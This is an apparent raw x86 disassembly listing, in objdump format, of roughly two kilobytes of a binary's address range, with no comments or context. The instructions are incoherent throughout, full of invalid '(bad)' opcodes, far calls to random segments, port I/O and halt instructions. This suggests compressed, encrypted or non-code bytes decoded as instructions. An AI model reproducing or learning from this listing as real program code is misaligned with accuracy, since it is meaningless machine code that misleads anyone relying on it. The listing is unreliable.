  4117e7:	das    
  4117e8:	pop    esp
  4117e9:	pop    edx
  4117ea:	cmp    al,0x82
  4117ec:	sbb    dl,dl
  4117ee:	ss sti 
  4117f0:	dec    ebx
  4117f1:	inc    ebp
  4117f2:	sbb    al,0xcc
  4117f5:	ror    ebp,1
  4117f7:	xchg   esp,eax
  4117f8:	push   edi
  4117f9:	imul   ecx,DWORD PTR [ecx-0x15],0x77f33663
  411800:	repnz scas al,BYTE PTR es:[edi]
  411802:	popf   
  411803:	lods   eax,DWORD PTR ds:[esi]
  411804:	aam    0xc4
  411806:	in     al,0x48
  411808:	pop    edx
  411809:	xchg   ebx,eax
  41180a:	xchg   ebx,eax
  41180b:	inc    edx
  41180c:	sar    BYTE PTR [eax],0xc5
  41180f:	mov    esp,0x111a6dab
  411814:	mov    eax,DWORD PTR [ebx+esi*2-0x48fd6b9b]
  41181b:	in     al,0x39
  41181d:	(bad)
  411820:	outs   dx,BYTE PTR ds:[esi]
  411821:	sub    esp,DWORD PTR [edi+edi*8+0x13]
  411825:	xchg   ebx,eax
  411826:	lods   al,BYTE PTR ds:[esi]
  411827:	or     eax,0xd63646cd
  41182c:	into   
  41182d:	lods   al,BYTE PTR ds:[esi]
  41182e:	and    ch,BYTE PTR es:[esi+0x7]
  411832:	inc    esp
  411833:	jnp    0x41189e
  411835:	mov    edi,0x7fb3b18d
  41183a:	call   0x19f7:0x8cbf937f
  411841:	or     al,0x3f
  411843:	pop    es
  411844:	imul   esp,ebx,0x27e91f0b
  41184a:	js     0x41186a
  41184c:	pop    es
  41184d:	imul   esi,DWORD PTR [esi+0x13],0xb52e35f9
  411854:	fwait
  411855:	repnz shl edi,0xc9
  411859:	inc    esp
  41185a:	adc    eax,0x70cfc4cb
  41185f:	ret    
  411860:	icebp  
  411861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411862:	aas    
  411863:	outs   dx,BYTE PTR ds:[esi]
  411864:	test   DWORD PTR [esi+edi*2+0x0],ecx
  411868:	(bad)  
  411869:	xchg   ebx,eax
  41186a:	or     dl,ah
  41186c:	sbb    al,0xdb
  41186e:	xchg   ebx,eax
  41186f:	add    DWORD PTR [esi-0xc],eax
  411872:	push   0xffffffc1
  411874:	xchg   esp,eax
  411875:	jg     0x4118cb
  411877:	dec    edx
  411878:	xchg   edi,eax
  411879:	jbe    0x41189a
  41187b:	push   esi
  41187c:	inc    ebp
  41187d:	mov    WORD PTR [edi+0x5f966dd0],gs
  411883:	sbb    BYTE PTR [ebx],bl
  411885:	sbb    al,0x76
  411887:	fld    TBYTE PTR [ebx-0x178b0797]
  41188d:	test   BYTE PTR [eax+eiz*4],ch
  411890:	packuswb mm0,QWORD PTR [eax-0x6e]
  411894:	call   0x3de2:0x12a824d5
  41189b:	(bad)  
  41189c:	imul   esi,DWORD PTR [ebp+0x57],0x79bd80cb
  4118a3:	push   eax
  4118a4:	hlt    
  4118a5:	loope  0x4118c7
  4118a7:	pop    eax
  4118a8:	test   BYTE PTR [eax-0x48],bl
  4118ab:	loop   0x411907
  4118ad:	fild   QWORD PTR [ebx-0x46ddd109]
  4118b3:	in     al,dx
  4118b4:	xor    esi,DWORD PTR [ecx-0x67]
  4118b7:	pop    ebx
  4118b8:	mov    cl,0xa5
  4118ba:	sub    ah,BYTE PTR [edi]
  4118bc:	les    eax,FWORD PTR [ebx+esi*2+0xe9ad5f8]
  4118c3:	push   esi
  4118c4:	ret    
  4118c5:	stc    
  4118c6:	xchg   esp,eax
  4118c7:	popf   
  4118c8:	sbb    edx,ebp
  4118ca:	or     esp,DWORD PTR gs:[eax]
  4118cd:	jmp    0xbed2165c
  4118d2:	(bad)  
  4118d3:	test   BYTE PTR [ebp+0x44178b69],0x14
  4118da:	(bad)  
  4118db:	jae    0x411905
  4118dd:	(bad)  
  4118de:	xor    DWORD PTR [esi],edx
  4118e0:	xchg   ebx,eax
  4118e1:	ror    BYTE PTR [ebx+edi*4+0x3a],1
  4118e5:	mov    cl,0x31
  4118e7:	icebp  
  4118e8:	jo     0x4118d7
  4118ea:	loope  0x411921
  4118ec:	cmp    edx,DWORD PTR [eax-0x49]
  4118ef:	popf   
  4118f0:	shl    BYTE PTR [esi+0x444e4b7f],cl
  4118f6:	cmp    al,0x29
  4118f8:	push   ebp
  4118f9:	jle    0x411930
  4118fb:	dec    ecx
  4118fc:	scas   al,BYTE PTR es:[edi]
  4118fd:	inc    ebp
  4118fe:	outs   dx,BYTE PTR ds:[esi]
  4118ff:	push   edi
  411900:	push   0x31
  411902:	shl    DWORD PTR [ebx],cl
  411904:	call   0xa56c:0xc1ab29ce
  41190b:	inc    ebx
  41190c:	pop    eax
  41190d:	jns    0x41197d
  41190f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411910:	dec    ebx
  411911:	out    0x7c,eax
  411913:	cmp    edi,DWORD PTR [esi+0x5f6340ca]
  411919:	into   
  41191a:	mov    edx,DWORD PTR [ebx-0x15]
  41191d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41191e:	adc    esi,DWORD PTR ds:0xda2a0eee
  411924:	inc    ebx
  411925:	int3   
  411926:	push   es
  411927:	push   esp
  411928:	imul   edx,DWORD PTR [ecx],0x770a72
  41192e:	sbb    eax,DWORD PTR [ecx+0xd]
  411931:	jb     0x4118d4
  411933:	jp     0x4118f0
  411935:	fs scas eax,DWORD PTR es:[edi]
  411937:	push   ds
  411938:	cmp    DWORD PTR [eax-0x4f],ebp
  41193b:	inc    ebp
  41193c:	es ror edi,1
  41193f:	inc    eax
  411940:	xor    eax,0xb0df2bd7
  411945:	adc    eax,0xfa1037af
  41194a:	dec    edx
  41194b:	bnd jae 0x4118d9
  41194e:	mov    bh,0x69
  411950:	lds    eax,FWORD PTR [edi-0x7d]
  411953:	inc    edx
  411954:	bound  eax,QWORD PTR [ecx-0x1d]
  411957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411958:	cmp    ebx,DWORD PTR [ebp+0x68d38a6d]
  41195e:	(bad)  
  41195f:	xor    BYTE PTR [ecx+0x0],dl
  411962:	push   eax
  411963:	cmp    eax,0xc4bc8cd
  411968:	stos   BYTE PTR es:[edi],al
  411969:	mov    esp,0x322b2555
  41196e:	mov    ds,ebx
  411970:	cmp    ah,cl
  411972:	dec    ecx
  411973:	mov    al,0x8a
  411975:	push   0xf84946ee
  41197a:	pop    eax
  41197b:	mov    ds:0xd02caa72,al
  411980:	push   es
  411981:	sub    al,0x1b
  411983:	xor    ecx,DWORD PTR [edx+ecx*1]
  411986:	fldenv ss:[ecx]
  411989:	cwde   
  41198a:	mov    esi,0x70bee638
  41198f:	sub    eax,DWORD PTR [edi+0x2d]
  411992:	ss mov cl,0xf5
  411996:	lds    eax,FWORD PTR [eax+0x30375094]
  41199c:	bound  eax,QWORD PTR [esi+0x1c]
  41199f:	sub    bl,BYTE PTR [edi]
  4119a1:	add    ecx,DWORD PTR [esi-0x3cca324d]
  4119a7:	add    BYTE PTR [eax-0x56],ah
  4119aa:	mov    ds:0x8bc1859,eax
  4119af:	or     dl,ch
  4119b1:	and    bh,BYTE PTR [eax-0x2c]
  4119b4:	xchg   ebx,eax
  4119b5:	fs retf 
  4119b7:	cmp    eax,0xc0a9df7b
  4119bc:	pop    edx
  4119bd:	pop    eax
  4119be:	push   ss
  4119bf:	jp     0x6af0e017
  4119c5:	mov    ecx,0xeee8f4fe
  4119ca:	and    DWORD PTR [ebx+0x42],edx
  4119cd:	popa   
  4119ce:	fild   WORD PTR [eax+0x5ab8f3b4]
  4119d4:	add    DWORD PTR [eax+0x32b30ebe],ecx
  4119da:	sbb    al,0xa1
  4119dc:	pop    ss
  4119dd:	fld    QWORD PTR [ebx+ebx*4-0x6e8fdf4f]
  4119e4:	fsub   DWORD PTR [esi-0x5b]
  4119e7:	(bad)  
  4119e8:	out    dx,al
  4119e9:	jbe    0x411a15
  4119eb:	add    edx,DWORD PTR [ebx]
  4119ed:	inc    edx
  4119ee:	cmp    eax,0xe65af8c0
  4119f3:	aas    
  4119f4:	pop    esp
  4119f5:	es mov bl,0x2b
  4119f8:	cmc    
  4119f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119fa:	shl    BYTE PTR [esi-0x258a3c05],1
  411a00:	pop    es
  411a01:	mov    edi,0xb7075f4
  411a06:	retf   
  411a07:	add    DWORD PTR [ebx],ebx
  411a09:	loope  0x411a32
  411a0b:	cmc    
  411a0c:	in     al,0xf2
  411a0e:	(bad)  
  411a0f:	test   BYTE PTR [ecx-0x168f035d],0x5e
  411a16:	jg     0x411a78
  411a18:	pop    ebx
  411a19:	das    
  411a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1b:	ret    
  411a1c:	and    ah,BYTE PTR [ebx]
  411a1e:	scas   al,BYTE PTR es:[edi]
  411a1f:	neg    DWORD PTR [edi-0x19]
  411a22:	nop
  411a23:	push   0x5186d5f7
  411a28:	or     esp,DWORD PTR [ebx-0x25baae62]
  411a2e:	in     al,0xc2
  411a30:	(bad)  
  411a31:	mov    ss,WORD PTR es:[edi]
  411a34:	cdq    
  411a35:	(bad)  
  411a36:	cwde   
  411a37:	xlat   BYTE PTR ds:[ebx]
  411a38:	iret   
  411a39:	mov    ebx,0x3d3c008f
  411a3e:	fiadd  WORD PTR ds:0xce2834d6
  411a44:	pusha  
  411a45:	cdq    
  411a46:	ror    DWORD PTR [ebp-0x60],cl
  411a49:	popa   
  411a4a:	push   eax
  411a4b:	cmp    al,0xb0
  411a4d:	pop    es
  411a4e:	pop    ds
  411a4f:	mov    edi,0xce12ba36
  411a54:	adc    esi,ebx
  411a56:	ror    BYTE PTR [ebp+0x61],0x8
  411a5a:	jae    0x411ab8
  411a5c:	jno    0x411a50
  411a5e:	popa   
  411a5f:	jg     0x411a20
  411a61:	or     DWORD PTR [edi-0x271359d6],0xffffffaa
  411a68:	add    BYTE PTR [edx+eax*2],ch
  411a6b:	jg     0x411ac7
  411a6d:	xor    BYTE PTR [edi],dl
  411a6f:	out    dx,al
  411a70:	div    BYTE PTR [ecx]
  411a72:	dec    edi
  411a73:	inc    ebp
  411a74:	enter  0xe9be,0xd0
  411a78:	vpunpckldq xmm4,xmm6,xmm1
  411a7c:	pop    es
  411a7d:	mov    ecx,0x57fd991d
  411a82:	jmp    0x411a23
  411a84:	enter  0x840c,0x88
  411a88:	hlt    
  411a89:	push   ss
  411a8a:	jns    0x411a32
  411a8c:	fdivr  DWORD PTR [ebp-0x38]
  411a8f:	xchg   ebx,eax
  411a90:	mov    al,ds:0xac9eced8
  411a95:	lahf   
  411a96:	add    dl,ch
  411a98:	mov    bl,0xc1
  411a9a:	xchg   eax,edi
  411a9c:	push   0x836fca52
  411aa1:	mov    esi,0x474ed598
  411aa6:	cs cmp eax,0x85fcb85
  411aac:	mov    dh,0xd
  411aae:	mov    ebp,0xa86ed30
  411ab3:	cli    
  411ab4:	cmp    al,0x4d
  411ab6:	sub    ah,BYTE PTR [ebx-0x3d10a496]
  411abc:	cmp    eax,0x92d9c41
  411ac1:	ror    BYTE PTR [edi+ebx*1+0x53],1
  411ac5:	inc    esi
  411ac6:	enter  0x3570,0x5e
  411aca:	std    
  411acb:	ss mov ecx,0xe34296e0
  411ad1:	push   ebp
  411ad2:	mov    ebp,0x670865d
  411ad7:	xor    eax,ecx
  411ad9:	bound  eax,QWORD PTR [ebx+0x78a84e21]
  411adf:	add    cl,BYTE PTR [ecx-0x6175cb]
  411ae5:	sub    al,BYTE PTR [ebx+ebx*8+0x2d]
  411ae9:	out    dx,al
  411aea:	xchg   esp,eax
  411aeb:	inc    ebp
  411aec:	or     eax,DWORD PTR [ebx+eax*8]
  411aef:	add    al,0x57
  411af1:	push   esp
  411af2:	sar    DWORD PTR [ebx],0x93
  411af5:	pop    eax
  411af6:	jge    0x411b26
  411af8:	addr16 jle 0x411b5d
  411afb:	jge    0x411a96
  411afd:	pop    ss
  411afe:	add    eax,0x92b78c7a
  411b03:	test   eax,0x21da81aa
  411b08:	add    edi,ecx
  411b0a:	jmp    0xa801bf20
  411b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b10:	int    0x86
  411b12:	xchg   ecx,ecx
  411b14:	out    0xf4,al
  411b16:	dec    esi
  411b17:	mov    eax,0x32c5e211
  411b1c:	mov    esi,0x8f32eaa0
  411b21:	je     0x411ac4
  411b23:	mov    ecx,DWORD PTR [esi-0x5d]
  411b26:	enter  0xb321,0xe4
  411b2a:	jmp    0xea39:0x522270d6
  411b31:	sbb    al,BYTE PTR [ebx]
  411b33:	ja     0x411b1c
  411b35:	xchg   ebp,eax
  411b36:	xor    al,BYTE PTR [edx+0x11]
  411b39:	mov    ch,cl
  411b3b:	out    dx,al
  411b3c:	jge    0x411b7b
  411b3e:	sub    bl,BYTE PTR [ebp+ecx*4+0x14]
  411b42:	addr16 push eax
  411b44:	out    dx,eax
  411b45:	shr    DWORD PTR [ebx-0x8],1
  411b48:	inc    edx
  411b49:	(bad)  
  411b4a:	push   ds
  411b4b:	mov    ebx,DWORD PTR [ecx+ecx*8]
  411b4e:	hlt    
  411b4f:	inc    esp
  411b50:	arpl   WORD PTR [edx+0x39],bp
  411b53:	add    DWORD PTR [ecx+0x70],0x6d
  411b57:	xchg   ebp,eax
  411b58:	test   DWORD PTR [esi+0x21],edx
  411b5b:	dec    ecx
  411b5c:	dec    eax
  411b5d:	jecxz  0x411b3c
  411b5f:	cmp    DWORD PTR [eax-0x46],edx
  411b62:	retf   
  411b63:	and    DWORD PTR [esi+edx*8-0x67],0xffffffe2
  411b68:	xor    al,dh
  411b6a:	push   0x4810e658
  411b6f:	mov    ebx,0xe104f326
  411b74:	xchg   ebx,eax
  411b75:	pop    ds
  411b76:	fdivr  st,st(3)
  411b78:	(bad)  
  411b79:	sub    esp,eax
  411b7b:	imul   DWORD PTR [eax]
  411b7d:	push   0x4f
  411b7f:	icebp  
  411b80:	lock jg 0x411bd9
  411b83:	xor    DWORD PTR [esp+esi*4-0x7bf188c6],edi
  411b8a:	out    0x8b,al
  411b8c:	or     cl,BYTE PTR [edx+eax*4]
  411b8f:	add    eax,0xf328b5e5
  411b94:	arpl   WORD PTR ds:0x914b601d,si
  411b9a:	mov    eax,DWORD PTR ds:0xaee74d43
  411ba0:	and    al,0xc7
  411ba2:	xor    BYTE PTR [ebx-0x5b],dl
  411ba5:	fild   DWORD PTR [esp+ecx*1-0x9]
  411ba9:	pushf  
  411baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bab:	hlt    
  411bac:	dec    edi
  411bad:	mov    eax,0x751de846
  411bb2:	push   ebx
  411bb3:	mov    eax,0x783934d8
  411bb8:	in     al,dx
  411bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bba:	or     DWORD PTR [eax+edx*4-0x6f],ebx
  411bbe:	or     DWORD PTR [ebx],edx
  411bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bc1:	sbb    ebx,DWORD PTR [ebx+0x1c65905d]
  411bc7:	ja     0x411c39
  411bc9:	push   ecx
  411bca:	rcr    DWORD PTR [ebp-0x42],cl
  411bcd:	in     al,0xa4
  411bcf:	mov    ecx,0xbcee3c00
  411bd4:	xchg   ebp,eax
  411bd5:	loope  0x411bc9
  411bd7:	ret    0x3a20
  411bda:	xor    al,0xa6
  411bdc:	out    dx,al
  411bdd:	xor    DWORD PTR [edx-0x4c],ebx
  411be0:	sub    BYTE PTR [edx],al
  411be2:	(bad)  
  411be3:	and    ebp,ebp
  411be5:	mov    dh,0xd4
  411be7:	scas   eax,DWORD PTR es:[edi]
  411be8:	cmp    BYTE PTR [ecx-0x6baf926a],ch
  411bee:	popa   
  411bef:	or     DWORD PTR [esi],edx
  411bf1:	adc    dl,BYTE PTR cs:[ebp+0x61]
  411bf5:	lds    ebp,FWORD PTR [ebx+0x6f8fd9cc]
  411bfb:	mov    bh,dl
  411bfd:	and    BYTE PTR [esi+0x79],ch
  411c00:	sbb    al,0xb6
  411c02:	dec    eax
  411c03:	cld    
  411c04:	call   0x5118:0xca7ae28f
  411c0b:	pop    esp
  411c0c:	jl     0x411c8a
  411c0e:	fwait
  411c0f:	cmp    al,0xc0
  411c11:	fsub   DWORD PTR [ebp-0x3b43ff69]
  411c17:	call   0xb3921a5f
  411c1c:	repnz ss test eax,0x54582421
  411c23:	es fsubr st,st(3)
  411c26:	xchg   ebx,eax
  411c27:	pop    edx
  411c28:	fisubr WORD PTR [ecx]
  411c2a:	les    eax,FWORD PTR [ebx-0x6c]
  411c2d:	mov    al,ds:0x66ba3e1c
  411c32:	add    al,0xde
  411c34:	xchg   edx,eax
  411c35:	xor    esp,eax
  411c37:	bound  ecx,QWORD PTR [eax]
  411c39:	cli    
  411c3a:	mov    cl,0x10
  411c3c:	push   ds
  411c3d:	mov    ebp,0xef283c
  411c42:	sub    eax,0xcf51e2b2
  411c47:	push   ecx
  411c48:	and    al,0xbd
  411c4a:	or     al,0xc6
  411c4c:	cmp    eax,0x5c70de50
  411c51:	daa    
  411c52:	call   0x67d8:0xc40698c6
  411c59:	xor    BYTE PTR [bp+di+0x69],0xa4
  411c5e:	shl    ebx,cl
  411c60:	scas   eax,DWORD PTR es:[edi]
  411c61:	sub    eax,0x45983c0d
  411c66:	lods   al,BYTE PTR ds:[esi]
  411c67:	add    eax,0x8dcae08
  411c6c:	adc    DWORD PTR [edi],ebp
  411c6e:	std    
  411c6f:	xchg   esi,eax
  411c70:	mov    ds:0x18bd38b2,al
  411c75:	clc    
  411c76:	pop    edx
  411c77:	aaa    
  411c78:	or     al,0x76
  411c7a:	int3   
  411c7b:	fidiv  WORD PTR [ebp-0x25]
  411c7e:	addr16 jnp 0x411c73
  411c81:	jmp    0x5593f558
  411c86:	xchg   esp,eax
  411c87:	mov    dh,0x39
  411c89:	mov    WORD PTR [ebp+0x45],?
  411c8c:	or     ebp,edi
  411c8e:	mov    edx,0x8abcd1ee
  411c93:	out    dx,eax
  411c94:	ss sti 
  411c96:	loope  0x411c8a
  411c98:	and    eax,0x276deb25
  411c9d:	imul   ecx,DWORD PTR [edi-0x6],0xffffffc4
  411ca1:	sbb    dh,dl
  411ca3:	xchg   esp,eax
  411ca4:	pop    eax
  411ca5:	mov    esp,0xdd846826
  411caa:	cld    
  411cab:	scas   eax,DWORD PTR es:[edi]
  411cac:	add    DWORD PTR [ebp+0x64255bdc],eax
  411cb2:	inc    ebp
  411cb3:	push   esi
  411cb4:	ins    BYTE PTR es:[edi],dx
  411cb5:	add    ah,bh
  411cb7:	leave  
  411cb8:	int    0x75
  411cba:	adc    BYTE PTR [esi-0x3bc05289],ah
  411cc0:	arpl   WORD PTR [eax-0x26f65e0c],cx
  411cc6:	cs inc ebx
  411cc8:	xchg   edi,eax
  411cc9:	mov    edx,0x5dd637fe
  411cce:	sahf   
  411ccf:	and    ah,ch
  411cd1:	jne    0x411c93
  411cd3:	ja     0x411cf9
  411cd5:	and    al,0x53
  411cd7:	dec    edi
  411cd8:	pop    ds
  411cd9:	mov    bp,0x6967
  411cdd:	ret    0x9f32
  411ce0:	sbb    DWORD PTR [ebp+eax*8-0x69],esp
  411ce4:	(bad)  
  411ce5:	ins    DWORD PTR es:[edi],dx
  411ce6:	pop    eax
  411ce7:	and    edi,DWORD PTR [edi+0x3e]
  411cea:	(bad)  
  411ceb:	and    eax,0xc3c7eb7f
  411cf0:	out    0x36,eax
  411cf2:	push   esp
  411cf3:	cmp    BYTE PTR [ebx+0x1d0eac93],dh
  411cf9:	retf   
  411cfa:	pop    esp
  411cfb:	or     cl,BYTE PTR [edx+edi*2+0x1f]
  411cff:	jb     0x411ca8
  411d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d02:	pop    eax
  411d03:	aas    
  411d04:	dec    ebp
  411d05:	jbe    0x411cae
  411d07:	idiv   ebx
  411d09:	leave  
  411d0a:	clc    
  411d0b:	xchg   edx,eax
  411d0c:	in     al,dx
  411d0d:	fisttp WORD PTR [ebp+0x47d86b89]
  411d13:	aad    0x40
  411d15:	inc    BYTE PTR [esi*1+0x4f0836db]
  411d1c:	push   esi
  411d1d:	pop    ecx
  411d1e:	xchg   ecx,eax
  411d1f:	repz mov ecx,0xa05962c8
  411d25:	dec    si
  411d27:	daa    
  411d28:	pop    ebx
  411d29:	dec    eax
  411d2a:	sbb    DWORD PTR [ebp+0x8],edi
  411d2d:	mov    eax,0xbb1c42a6
  411d32:	ror    BYTE PTR [edi],cl
  411d34:	loopne 0x411ce3
  411d36:	inc    ecx
  411d37:	std    
  411d38:	mov    edx,0x9d9d08d7
  411d3d:	or     eax,0x21bff91
  411d42:	jecxz  0x411d47
  411d44:	es jbe 0x411d2f
  411d47:	bound  esi,QWORD PTR [ebx-0x22]
  411d4a:	int3   
  411d4b:	mov    es,WORD PTR [eax]
  411d4d:	addr16 and ecx,esp
  411d50:	lods   al,BYTE PTR ds:[esi]
  411d51:	daa    
  411d52:	push   esp
  411d53:	jl     0x411daf
  411d55:	pop    ecx
  411d56:	jb     0x411d70
  411d58:	adc    bh,0x94
  411d5b:	inc    ebx
  411d5c:	clc    
  411d5d:	xchg   esi,eax
  411d5e:	jge    0x411d97
  411d60:	ss xchg ch,bh
  411d63:	add    eax,DWORD PTR [eax]
  411d65:	inc    edx
  411d66:	mov    DWORD PTR ds:0xedfe713d,0x1434229a
  411d70:	inc    ebp
  411d71:	fld    st(6)
  411d73:	add    bh,ch
  411d75:	out    dx,al
  411d76:	push   es
  411d77:	or     edx,DWORD PTR [ebp-0x55]
  411d7a:	mov    edi,0x626fa498
  411d7f:	push   ecx
  411d80:	call   0x3671f744
  411d85:	retf   
  411d86:	pop    ecx
  411d87:	mov    al,ds:0x558f4be8
  411d8c:	test   eax,0xa31723f6
  411d91:	adc    eax,0xb6254e0b
  411d96:	xchg   BYTE PTR [ecx],dh
  411d98:	rcl    DWORD PTR [ebx-0xb],1
  411d9b:	loopne 0x411d3f
  411d9d:	jmp    0x252d3c75
  411da2:	std    
  411da3:	or     al,0x5c
  411da5:	lods   al,BYTE PTR ds:[esi]
  411da6:	lock push ebx
  411da8:	push   ebx
  411da9:	jge    0x411dc4
  411dab:	pop    ss
  411dac:	mov    bl,0xd5
  411dae:	and    esp,DWORD PTR [edi+edi*4-0x21]
  411db2:	icebp  
  411db3:	xchg   ecx,eax
  411db4:	push   0xb40f9289
  411db9:	(bad)  
  411dbb:	push   edi
  411dbc:	fwait
  411dbd:	xchg   ebp,eax
  411dbe:	and    DWORD PTR [edx+0x855cb7a],ecx
  411dc4:	cmp    BYTE PTR [esi],bh
  411dc6:	push   esi
  411dc7:	sbb    eax,0x5934fa77
  411dcc:	sbb    eax,0x90f13f1b
  411dd1:	sbb    ecx,DWORD PTR [ebx+ebx*2]
  411dd4:	(bad)  
  411dd5:	stc    
  411dd6:	adc    dl,BYTE PTR [edx-0x49b2faf1]
  411ddc:	dec    edi
  411ddd:	fstp   QWORD PTR [edi]
  411ddf:	mov    ch,0xd
  411de1:	or     dh,dl
  411de3:	mov    bl,0x9c
  411de5:	popf   
  411de6:	mov    cl,0x1e
  411de8:	sahf   
  411de9:	push   esp
  411dea:	shl    DWORD PTR [edx-0x39de79a1],0x86
  411df1:	mov    bh,0xe
  411df3:	mov    ebx,0xc043b40a
  411df8:	or     cl,BYTE PTR [esi]
  411dfa:	sub    BYTE PTR [ebp+0x6],dh
  411dfd:	scas   al,BYTE PTR es:[edi]
  411dfe:	les    ecx,FWORD PTR [eax+0x5e53bc6b]
  411e04:	or     bh,bl
  411e06:	adc    DWORD PTR [ecx-0x1f86c703],ebp
  411e0c:	add    ebp,edx
  411e0e:	outs   dx,BYTE PTR ds:[esi]
  411e0f:	cs retf 
  411e11:	daa    
  411e12:	cmc    
  411e13:	inc    eax
  411e14:	mov    ebp,0x290b2454
  411e19:	mov    ch,0xf
  411e1b:	inc    edx
  411e1c:	or     eax,0x821c1296
  411e21:	scas   eax,DWORD PTR es:[edi]
  411e22:	aad    0xc0
  411e24:	jo     0x411e11
  411e26:	push   es
  411e27:	jmp    0x411e62
  411e29:	jns    0x411e28
  411e2b:	jae    0x411dbe
  411e2d:	(bad)  
  411e2f:	mov    eax,0x9ed16945
  411e34:	xor    ebp,eax
  411e36:	pop    ebp
  411e37:	stos   BYTE PTR es:[edi],al
  411e38:	dec    eax
  411e39:	add    BYTE PTR gs:[ebx-0x2f],ah
  411e3d:	repnz gs in al,0xef
  411e41:	inc    ebx
  411e42:	or     al,0xe4
  411e44:	repz jb 0x411eb4
  411e47:	sub    DWORD PTR [esi],ebp
  411e49:	sbb    ebx,DWORD PTR [edi-0x3538bce0]
  411e4f:	ror    DWORD PTR [eax+edx*2-0x24d6e41c],cl
  411e56:	push   eax
  411e57:	mov    bl,0x92
  411e59:	fild   QWORD PTR [esi]
  411e5b:	aad    0xac
  411e5d:	xor    ch,BYTE PTR [edi]
  411e5f:	xchg   bh,bh
  411e61:	ja     0x411ed5
  411e63:	cmc    
  411e64:	sbb    eax,0x4c357217
  411e69:	mov    ds:0x84fbf4fa,al
  411e6e:	aas    
  411e6f:	xchg   ecx,eax
  411e70:	jbe    0x411e6e
  411e72:	out    0x2c,al
  411e74:	pop    esp
  411e75:	ja     0x411e7e
  411e77:	out    0xa5,ax
  411e7a:	and    eax,0xb9fcb45b
  411e7f:	or     al,0x3
  411e81:	imul   ebp,DWORD PTR [edi+0x4c],0x5e
  411e85:	or     eax,0x31737caa
  411e8a:	dec    edx
  411e8b:	push   edx
  411e8c:	cwde   
  411e8d:	xor    al,0xa8
  411e8f:	jle    0x411edd
  411e91:	frstorw [edi]
  411e94:	push   eax
  411e95:	cmp    DWORD PTR [edi-0x558eefdf],esi
  411e9b:	pop    esi
  411e9c:	cmp    DWORD PTR [edi-0xe95a047],0x5bf8497
  411ea6:	ja     0x411e66
  411ea8:	in     eax,0xbe
  411eaa:	daa    
  411eab:	cmp    BYTE PTR ds:0xf9241f67,0x5b
  411eb2:	popa   
  411eb3:	das    
  411eb4:	es push eax
  411eb6:	fidivr WORD PTR [ebp-0x62b0c394]
  411ebc:	sub    eax,0xaae5fe05
  411ec1:	xchg   ebx,eax
  411ec2:	and    al,0xcc
  411ec4:	jmp    0x83f82468
  411ec9:	xchg   esp,eax
  411eca:	leave  
  411ecb:	inc    eax
  411ecc:	nop
  411ecd:	out    0x3b,eax
  411ecf:	stc    
  411ed0:	cmp    BYTE PTR [edx+edx*8+0x4e2ef02b],al
  411ed7:	inc    esi
  411ed8:	int3   
  411ed9:	ins    BYTE PTR es:[edi],dx
  411eda:	add    BYTE PTR [ebx+0x31],cl
  411edd:	in     al,0x25
  411edf:	dec    ecx
  411ee0:	add    al,al
  411ee2:	ret    0x4d4a
  411ee5:	imul   ebx,DWORD PTR [edx-0x304e5c30],0x38
  411eec:	and    eax,0x2b5d6673
  411ef1:	or     al,0x6f
  411ef3:	not    DWORD PTR [ebp+0x10]
  411ef6:	repnz aam 0x61
  411ef9:	imul   eax,DWORD PTR [eax],0xe9463537
  411eff:	pop    esi
  411f00:	js     0x411e8c
  411f02:	(bad)  
  411f03:	into   
  411f04:	iret   
  411f05:	clc    
  411f06:	jno    0x411f7b
  411f08:	add    cl,BYTE PTR [edi-0x77]
  411f0b:	dec    ecx
  411f0c:	inc    ebp
  411f0d:	rcl    esp,0xbd
  411f10:	pop    ebx
  411f11:	pop    ecx
  411f12:	daa    
  411f13:	push   eax
  411f14:	sub    bh,BYTE PTR [esi-0x3c458003]
  411f1a:	or     ebx,edi
  411f1c:	dec    edi
  411f1d:	cdq    
  411f1e:	cdq    
  411f1f:	pusha  
  411f20:	jecxz  0x411f42
  411f22:	dec    edi
  411f23:	fistp  QWORD PTR [eax]
  411f25:	jge    0x411ec0
  411f27:	inc    ebp
  411f28:	inc    esi
  411f29:	cmp    al,0x1d
  411f2b:	or     ch,BYTE PTR [esi-0x1]
  411f2e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f30:	out    0x69,eax
  411f32:	fwait
  411f33:	ins    DWORD PTR es:[edi],dx
  411f34:	retf   0x7b7d
  411f37:	push   ebx
  411f38:	das    
  411f39:	loopne 0x411f4a
  411f3b:	xchg   edx,eax
  411f3c:	in     eax,0x84
  411f3e:	cwd    
  411f40:	inc    edi
  411f41:	into   
  411f42:	hlt    
  411f43:	dec    ebp
  411f44:	inc    ebx
  411f45:	xchg   ebx,eax
  411f46:	rcr    BYTE PTR [edx+0x57],cl
  411f49:	xchg   edi,eax
  411f4a:	daa    
  411f4b:	rol    BYTE PTR [edx-0x12229399],1
  411f51:	addr16 mov ds:0x5483,al
  411f55:	jae    0x411f45
  411f57:	jb     0x411f2a
  411f59:	jb     0x411f13
  411f5b:	fsubr  QWORD PTR [eax-0x5b]
  411f5e:	iret   
  411f5f:	inc    edi
  411f60:	jmp    0xadd06951
  411f65:	adc    eax,edx
  411f67:	bound  ecx,QWORD PTR [ecx-0x3f]
  411f6a:	add    eax,0x973e314a
  411f6f:	and    al,0x41
  411f71:	hlt    
  411f72:	mov    esp,0x4f2a3970
  411f77:	add    al,0x78
  411f79:	call   0x3fdd:0x24dacb04
  411f80:	sbb    DWORD PTR [ebx-0x1bb5bd80],esi
  411f86:	cmc    
  411f87:	sbb    ch,cl
  411f89:	mov    cl,0x3b
  411f8b:	sub    ebx,DWORD PTR [ecx]
  411f8d:	cli    
  411f8e:	jmp    0xf42b:0x56d08098
  411f95:	mov    ecx,0x7db87
  411f9a:	hlt    
  411f9b:	call   0x9fdc5902
  411fa0:	add    ah,dl
  411fa2:	and    al,0xa8
  411fa4:	shr    DWORD PTR [edi+0x20],1
